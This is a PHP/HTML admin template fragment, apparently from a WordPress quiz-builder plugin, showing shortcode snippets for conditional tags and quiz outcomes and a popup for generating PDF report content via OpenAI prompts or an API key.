							<div class="sqb-shortcode-heading"><span>Conditional Tags (AND)</span>
							<div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field" style="width:265px;right:-48px;">Show this to quiz takers that get ALL the 3 tags.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_show_category_conditionaltags">[ConditionalTAGS Name="tag1,tag2,tag3" Operator="AND"]Show this to quiz takers that get ALL the 3 tags.[/ConditionalTAGS]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_show_category_conditionaltags" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Conditional Tags (OR)</span>
							<div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field" style="width:265px;right:-48px;">Show this to quiz takers that get ANY ONE of these 3 tags.	</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_show_category_conditionaltagsor">[ConditionalTAGS Name="tag1,tag2,tag3" Operator="OR"] Show this to quiz takers that get ANY ONE of these 3 tags.[/ConditionalTAGS]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_show_category_conditionaltagsor" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>
						
						


					</div>
				</div>	

				<div class="sqb-new-accordion-item">
					<div class="sqb-new-accordion-header">Personality</div>
					<div class="sqb-new-accordion-content">
						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Outcome Title for Rank</span>
							<div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field" style="width:265px;right:-48px;">Display outcome title for rank 1 outcome.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_outcometitlerank">[ShowOutcomeTitle Rank="1"]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_outcometitlerank" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>

						<div class="addtoeditor">
							<div class="sqb-shortcode-heading"><span>Outcome Description for Rank</span>
							<div class="tool-tip custom-field-personadivze user-tags"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc rank_tag custom-field" style="width:265px;right:-48px;">Display outcome description for rank 1 outcome.</div> </div>
							</div>
							<div class="sqb-shortcode-merge-tag-wrapper">
								<span class="shortcode_display" id="dynamic_copyable_text_sqb_quiz_outcomedescrank">[ShowOutcomeDesc Rank="1"]</span>
								<span data-id="dynamic_copyable_text_sqb_quiz_outcomedescrank" class="copy-btn " onclick="sqb_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
							</div>
						</div>


					</div>
				</div>
				

					


				</div>
				
				
			</div>
			
		</div>
	</div>
</div>


<div class="Manage_Side_Popup personality_side_popup_options_wrapper pdf_ai_popup_options_wrapper quiz-form-side-popup active_Side_Popup1" id="pdf_ai_popup_options_wrapper">
	<div class="Manage_Side_Popup-inner">
		<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		<h4 class="main-title">Add PDF content using AI</h4>
		<div class="sqb-quiz-type-content-wrapper Manage_Side_Popup_content edit-member-wrapper edit-sqbpdf-ai-main-screen">

			<section class="sqbpdf-ai-screen-list edit-sqbpdf-ai-selection-screen sqbpdf-ai-type sqbpdf-ai-active-screen">
				<div class="sqbpdf-ai-quiz-selection-screen sqbpdf-ai-screen" style="" id="sqbpdf-ai-quiz-selection-screen" data-screen="title">
					<div class="sqbpdf-ai_form sqbpdf-ai-quiz-common-info">
						<?php
						
						$check_licence = get_option('AIQActivated', '');
						if ($check_licence == 'Y') {
						$open_ai = trim(get_option('sqb_chat_gpt_api_key', ''));  ?>
							<h2 class="sqbpdf-ai-section-heading aid-mt-30 aid-mb-10">Pick an Option</h2>
							<div class="sqbpdf-ai_form_input">
								<p class="control-label sqbpdf-ai-section-content aid-mb-30">OpenAI charges a fee for the API calls. While it's about $0.002/token (please check current pricing on their <a href="https://openai.com/pricing" target="_blank">site</a>), it's not free. If you don't want to spend on the API calls, you can use the manual option. Details below.</p>
								<div class="sqbpdf-ai_form_template_wrapper">

									<?php if ($open_ai == '') {  } ?>
									
									<div class="sqbpdf-ai-item-main-box">
										<div class="sqbpdf-ai-item-inner">
											<div class="sqbpdf-ai-item-text">
												<h2>No API call (FREE)</h2>
												<p>As OpenAI APIs are not free, give us the title, we'll give you the prompts for it. Enter it in PDF directly. And then enter the response from sqbpdf-ai here.</p>
												<button class="edit-sqbpdf-ai_manual_flow sqbpdf-ai-btn">Use This</button>
											</div>
										</div>
										<div class="sqbpdf-ai-item-inner">
											<div class="sqbpdf-ai-item-text">
												<h2>API call</h2>
												<p>If you have signed up for the API,<br>
													you can enter the key <a href="<?php echo site_url() ?>/wp-admin/admin.php?page=sqb_settings&tab=chat_gpt_integration" target="_blank"> here.</a><br>
													You can get the key from <a href="https://platform.openai.com/account/api-keys" target="_blank"> here.</a></p>
												<?php if ($open_ai != '') { ?>
													<button class="edit-sqbpdf-ai_auto_flow sqbpdf-ai-btn">Use This</button>
												<?php }else{ ?>
													<button class="sqbpdf-ai_auto_flow_error sqbpdf-ai-btn" disabled>Use This</button>
												<?php } ?>
												
											</div>
										</div>
									</div>
								</div>
							</div>
						<?php }else{
							// sqbpdf_ai_purchase_link();
						} ?>
					</div>
				</div>
			</section>

			<section class="sqbpdf-ai-screen-list edit-sqbpdf-ai-manual-basic-screen sqbpdf-ai-type">
				<div class="sqbpdf-ai-quiz-start-screen sqbpdf-ai-screen sqbpdf-ai-quiz-common-info">

					<div class="edit-sqbpdf-ai-field-group-for-show-ui">
						<div class="sqbpdf-ai-field-row ai-lesson_number_count js-select2-wrapper">
							<label class="control-label"><span>Select Quiz</span>
							<div class="tool-tip custom-field-personadivze"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-175px;">This will help AI generate the right type of PDF content based on the quiz. </div> </div>
							</label>
							<?php
								global $wpdb; // WordPress database access object

								// Query to retrieve data from the custom table
								$quiz_table = $wpdb->prefix.'sqb_quiz';
								$query = "SELECT id, quiz_name FROM $quiz_table ORDER BY id DESC ";
								
								$results = $wpdb->get_results($query);
						
								// Generate select dropdown
								echo '<select name="ai_quiz_select" id="ai_quiz_select" class="form-control js-select2">';
								echo '<option value="">Select Quiz</option>'; // Default option
								if(!empty($results)){
									foreach ($results as $result) {
										echo '<option value="' . esc_html($result->id) . '">' . stripslashes(esc_html($result->quiz_name)).' (ID : '.$result->id.')' . '</option>';
									}
								}
								echo '</select>';
								?>

							
						</div>

						<div class="sqbpdf-ai-field-row ai-lesson_number_count js-select2-wrapper">
							<label class="control-label"><span>Select Outcome</span>
							<div class="tool-tip custom-field-personadivze"><i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc custom-field" style="width:265px;right:-175px;">This will let AI know the name of the outcome for which you are generating the PDF content</div> </div>
							</label>
							<select name="ai_quiz_outcome" id="ai_quiz_outcome" class="form-control">
								<option value="">Select Outcome</option>
							</select>
						</div>
							
						<div class="sqbpdf-ai-field-row ai-lesson_number_count">
							<label class="control-label">What's the main goal of this quiz?</label>
							<input class="sqbpdf-ai-field-input sqbpdf-ai-small sqb-pdf-ai-goal" name="sqb-pdf-ai-goal" type="text" id="sqb-pdf-ai-goal" placeholder="For e.g., I want to create a quiz to help my audience figure out which type of online courses they should create. ">
						</div>


						<div class="sqbpdf-ai-field-row aid-mt-20 js-select2-wrapper">
							<label class="control-label">Language</label>
							<select id="edit_sqbpdf_ai_course_lang" name="edit_sqbpdf_ai_course_lang" class="form-control js-select2-product edit_sqbpdf_ai_course_lang">
								<option value="Afar">Afar</option>
								<option value="Abkhazian">Abkhazian</option>
								<option value="Avestan">Avestan</option>
								<option value="Afrikaans">Afrikaans</option>
								<option value="Akan">Akan</option>
								<option value="Amharic">Amharic</option>
								<option value="Aragonese">Aragonese</option>
								<option value="Arabic">Arabic</option>
								<option value="Assamese">Assamese</option>
								<option value="Avaric">Avaric</option>
								<option value="Aymara">Aymara</option>
								<option value="Azerbaijani">Azerbaijani</option>
								<option value="Bashkir">Bashkir</option>
								<option value="Belarusian">Belarusian</option>
								<option value="Bulgarian">Bulgarian</option>
								<option value="Bihari languages">Bihari languages</option>
								<option value="Bislama">Bislama</option>
								<option value="Bambara">Bambara</option>
								<option value="Bengali">Bengali</option>
								<option value="Tibetan">Tibetan</option>
								<option value="Breton">Breton</option>
								<option value="Bosnian">Bosnian</option>
								<option value="Catalan">Catalan</option>
								<option value="Chechen">Chechen</option>
								<option value="Chamorro">Chamorro</option>
								<option value="Corsican">Corsican</option>
								<option value="Cree">Cree</option>
								<option value="Czech">Czech</option>
								<option value="Church Slavic">Church Slavic</option>
								<option value="Chuvash">Chuvash</option>
								<option value="Welsh">Welsh</option>
								<option value="Danish">Danish</option>
								<option value="German">German</option>
								<option value="Divehi">Divehi</option>
								<option value="Dzongkha">Dzongkha</option>
								<option value="Ewe">Ewe</option>
								<option value="Greek">Greek</option>
								<option value="English" selected="">English</option>
								<option value="Esperanto">Esperanto</option>
								<option value="Spanish">Spanish</option>
								<option value="Estonian">Estonian</option>
								<option value="Basque">Basque</option>
								<option value="Persian">Persian</option>
								<option value="Fulah">Fulah</option>
								<option value="Finnish">Finnish</option>
								<option value="Fijian">Fijian</option>
								<option value="Faroese">Faroese</option>
								<option value="French">French</option>
								<option value="Western Frisian">Western Frisian</option>
								<option value="Irish">Irish</option>
								<option value="Scottish Gaelic">Scottish Gaelic</option>
								<option value="Galician">Galician</option>
								<option value="Guarani">Guarani</option>
								<option value="Gujarati">Gujarati</option>
								<option value="Manx">Manx</option>
								<option value="Hausa">Hausa</option>
								<option value="Hebrew">Hebrew</option>
								<option value="Hindi">Hindi</option>
								<option value="Hiri Motu">Hiri Motu</option>
								<option value="Croatian">Croatian</option>
								<option value="Haitian">Haitian</option>
								<option value="Hungarian">Hungarian</option>
								<option value="Armenian">Armenian</option>
								<option value="Herero">Herero</option>
								<option value="Interlingua">Interlingua</option>
								<option value="Indonesian">Indonesian</option>
								<option value="Interlingue">Interlingue</option>
								<option value="Igbo">Igbo</option>
								<option value="Sichuan Yi">Sichuan Yi</option>
								<option value="Inupiaq">Inupiaq</option>
								<option value="Ido">Ido</option>
								<option value="Icelandic">Icelandic</option>
								<option value="Italian">Italian</option>
								<option value="Inuktitut">Inuktitut</option>
								<option value="Japanese">Japanese</option>
								<option value="Javanese">Javanese</option>
								<option value="Georgian">Georgian</option>
								<option value="Kongo">Kongo</option>
								<option value="Kikuyu">Kikuyu</option>
								<option value="Kuanyama">Kuanyama</option>
								<option value="Kazakh">Kazakh</option>
								<option value="Kalaallisut">Kalaallisut</option>
								<option value="Central Khmer">Central Khmer</option>
								<option value="Kannada">Kannada</option>
								<option value="Korean">Korean</option>
								<option value="Kanuri">Kanuri</option>
								<option value="Kashmiri">Kashmiri</option>
								<option value="Kurdish">Kurdish</option>
								<option value="Komi">Komi</option>
								<option value="Cornish">Cornish</option>
								<option value="Kirghiz">Kirghiz</option>
								<option value="Latin">Latin</option>
								<option value="Luxembourgish">Luxembourgish</option>
								<option value="Ganda">Ganda</option>
								<option value="Limburgish">Limburgish</option>
								<option value="Lingala">Lingala</option>
								<option value="Lao">Lao</option>
								<option value="Lithuanian">Lithuanian</option>
								<option value="Luba-Katanga">Luba-Katanga</option>
								<option value="Latvian">Latvian</option>
								<option value="Malagasy">Malagasy</option>
								<option value="Marshallese">Marshallese</option>
								<option value="Maori">Maori</option>
								<option value="Macedonian">Macedonian</option>
								<option value="Malayalam">Malayalam</option>
								<option value="Mongolian">Mongolian</option>
								<option value="Marathi">Marathi</option>
								<option value="Malay">Malay</option>
								<option value="Maltese">Maltese</option>
								<option value="Burmese">Burmese</option>
								<option value="Nauru">Nauru</option>
								<option value="Norwegian Bokmål">Norwegian Bokmål</option>
								<option value="North Ndebele">North Ndebele</option>
								<option value="Nepali">Nepali</option>
								<option value="Ndonga">Ndonga</option>
								<option value="Dutch">Dutch</option>
								<option value="Norwegian Nynorsk">Norwegian Nynorsk</option>
								<option value="Norwegian">Norwegian</option>
								<option value="South Ndebele">South Ndebele</option>
								<option value="Navajo">Navajo</option>
								<option value="Chichewa">Chichewa</option>
								<option value="Occitan">Occitan</option>
								<option value="Ojibwa">Ojibwa</option>
								<option value="Oromo">Oromo</option>
								<option value="Oriya">Oriya</option>
								<option value="Ossetian">Ossetian</option>
								<option value="Panjabi">Panjabi</option>
								<option value="Pali">Pali</option>
								<option value="Polish">Polish</option>
								<option value="Pushto">Pushto</option>
								<option value="Portuguese">Portuguese</option>
								<option value="Quechua">Quechua</option>
								<option value="Romansh">Romansh</option>
								<option value="Rundi">Rundi</option>
								<option value="Romanian">Romanian</option>
								<option value="Russian">Russian</option>
								<option value="Kinyarwanda">Kinyarwanda</option>
								<option value="Sanskrit">Sanskrit</option>
								<option value="Sardinian">Sardinian</option>
								<option value="Sindhi">Sindhi</option>
								<option value="Northern Sami">Northern Sami</option>
								<option value="Sango">Sango</option>
								<option value="Sinhala">Sinhala</option>
								<option value="Slovak">Slovak</option>
								<option value="Slovenian">Slovenian</option>
								<option value="Samoan">Samoan</option>
								<option value="Shona">Shona</option>
								<option value="Somali">Somali</option>
								<option value="Albanian">Albanian</option>
								<option value="Serbian">Serbian</option>
								<option value="Swati">Swati</option>
								<option value="Sotho, Southern">Sotho, Southern</option>
								<option value="Sundanese">Sundanese</option>
								<option value="Swedish">Swedish</option>
								<option value="Swahili">Swahili</option>
								<option value="Tamil">Tamil</option>
								<option value="Telugu">Telugu</option>
								<option value="Tajik">Tajik</option>
								<option value="Thai">Thai</option>
								<option value="Tigrinya">Tigrinya</option>
								<option value="Turkmen">Turkmen</option>
								<option value="Tagalog">Tagalog</option>
								<option value="Tswana">Tswana</option>
								<option value="Tonga (Tonga Islands)">Tonga (Tonga Islands)</option>
								<option value="Turkish">Turkish</option>
								<option value="Tsonga">Tsonga</option>
								<option value="Tatar">Tatar</option>
								<option value="Twi">Twi</option>
								<option value="Tahitian">Tahitian</option>
								<option value="Uighur">Uighur</option>
								<option value="Ukrainian">Ukrainian</option>
								<option value="Urdu">Urdu</option>
								<option value="Uzbek">Uzbek</option>
								<option value="Venda">Venda</option>
								<option value="Vietnamese">Vietnamese</option>
								<option value="Volapük">Volapük</option>
								<option value="Walloon">Walloon</option>
								<option value="Wolof">Wolof</option>
								<option value="Xhosa">Xhosa</option>
								<option value="Yiddish">Yiddish</option>
								<option value="Yoruba">Yoruba</option>
								<option value="Zhuang">Zhuang</option>
								<option value="Chinese">Chinese</option>
								<option value="Zulu">Zulu</option>
							</select>
						</div>
					</div>

					<div class="edit-sqbpdf-ai-field-group-for-show-text sqbpdf-ai-hide">
						<div class="sqbpdf-ai-field-row aid-mt-0">
							<label class="control-label">Prompt</label>
							<textarea name="edit_sqbpdf_ai_course_prompt" id="edit_sqbpdf_ai_course_prompt" style="height:280px;" class="sqbpdf-ai-field-input sqbpdf-ai-normal"></textarea>
						</div>
					</div>


					<div class="sqbpdf-ai-field-row aid-max-700-old aid-mt-30 sqbpdf-justify-content-space-between">
						<button class="sqbpdf-ai-back-btn sqbpdf-ai-btn sqbpdf-ai-btn-gray "  data-prev="edit-sqbpdf-ai-selection-screen">Back</button>

						<button class="sqbpdf-ai-btn edit-sqbpdf-show-outline-prompt-btn sqbpdf-ai-btn-underline ai-showonly-api" id="edit_sqbpdf_ai_outline_prompt_text" >Show Prompt</button>

						<button class="edit-sqbpdf-ai-next-btn sqbpdf-ai-btn" data-next="edit-sqbpdf-ai-manual-outline-prompt-screen" data-screen="edit-generate-outline">Next</button>
						
					</div>
				</div>
			</section>

			<section class="sqbpdf-ai-screen-list edit-sqbpdf-ai-manual-outline-prompt-screen sqbpdf-ai-type">
				<div class="sqbpdf-ai-quiz-start-screen sqbpdf-ai-screen sqbpdf-ai-quiz-common-info">
					<div class="sqbpdf-ai-field-main-wrapper aid-mt-0">
						<div class="sqbpdf-ai-field-row aid-max-700-old aid-mt-0 sqbpdf_ai_prompt_response_wrapper">
							<div class="sqbpdf_ai_prompt_format_wrapper sqbpdf_ai_outcome_prompt_code_show">
								<label class="gpt-alert-box aid-mb-20 ">You can use this prompt in ChatGPT. Please copy/paste this in ChatGPT for PDF report ideas. <br> Do NOT remove the sections highlighted in red from the prompt.</label>
								<div class="code-container">
									<div class="aiq-copy-btn-wrapper">
										<span class="copy-icon" data-id="edit_sqbpdf_ai_outline_prompt_format_code" onclick="sqbpdf_copy_to_clipboardNew(this)"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg><i>Copy Code</i></span>
									</div>
								<code id="edit_sqbpdf_ai_outline_prompt_format_code" class="sqbpdf_ai_prompt_format"></code>
								</div>
								
							</div>
						</div>

						<div class="sqbpdf-ai-field-row aid-max-700-old aid-mt-30 sqbpdf-justify-content-space-between">
							<button class="sqbpdf-ai-back-btn sqbpdf-ai-btn sqbpdf-ai-btn-gray "  data-prev="edit-sqbpdf-ai-manual-basic-screen">Back</button>
							<button class="sqbpdf-ai-btn btn-copy-propmpt sqbpdf-ai-btn-underline" data-id="edit_sqbpdf_ai_outline_prompt_format_code" onclick="sqbpdf_copy_to_clipboardNew(this)"><i>Copy Code</i></button>
							<button class="edit-sqbpdf-ai-next-btn sqbpdf-ai-btn" data-next="edit-sqbpdf-ai-manual-outline-prompt-submit-screen" >Next</button>
						</div>
					</div>
				</div>
			</section>

			<section class="sqbpdf-ai-screen-list edit-sqbpdf-ai-manual-outline-prompt-submit-screen sqbpdf-ai-type">
				<div class="sqbpdf-ai-quiz-start-screen sqbpdf-ai-screen sqbpdf-ai-quiz-common-info">

					<div class="sqbpdf-ai-field-main-wrapper aid-mt-30">
						<div class="sqbpdf-ai-field-row aid-max-700-old aid-mt-30 sqbpdf_ai_prompt_response_wrapper">
							<div class="sqbpdf_ai_form_input_wrapper">
								<textarea name="edit_sqbpdf_ai_outline_json" id="edit_sqbpdf_ai_outline_json" placeholder="Enter the ChatGPT response here" class="sqbpdf_ai_prompt_textarea"></textarea>
							</div>
						</div>

						<div class="sqbpdf-ai-field-row aid-max-700-old aid-mt-30 sqbpdf-justify-content-space-between">
							<button class="sqbpdf-ai-back-btn sqbpdf-ai-btn sqbpdf-ai-btn-gray "  data-prev="edit-sqbpdf-ai-manual-outline-prompt-screen">Back</button>
							<button class="sqb-pdf-ai-put-content sqbpdf-ai-btn ai-showonly-manual" data-next="edit-sqbpdf-ai-manual-outline-selection-screen" data-screen="edit-generate-html-outline">Save and Close</button>
							<button class="sqb-pdf-ai-put-content sqbpdf-ai-btn ai-showonly-api" data-next="edit-sqbpdf-ai-manual-outline-selection-screen" data-screen="edit-generate-html-outline">Generate</button>
						</div>
					</div>
				</div>
			</section>

		</div>
	</div>
</div>

<script>
	<?php $data_ai_prompt = get_openAI_prompts_array(); ?>
	var pdf_aicontent = '<?php echo str_replace("'","\'",$data_ai_prompt['pdf_aicontent'])  ?>';
  jQuery(document).ready(function() {
    jQuery('.sqb-new-accordion-header').click(function() {
      var accordionItem = jQuery(this).parent('.sqb-new-accordion-item');
      var accordionContent = jQuery(this).next('.sqb-new-accordion-content');
      
      if (accordionItem.hasClass('active')) {
        accordionItem.removeClass('active');
        accordionContent.slideUp();
      } else {
        jQuery('.sqb-new-accordion-item.active').removeClass('active');
        jQuery('.sqb-new-accordion-content').slideUp();
        
        accordionItem.addClass('active');
        accordionContent.slideDown();
      }
    });
  });
</script>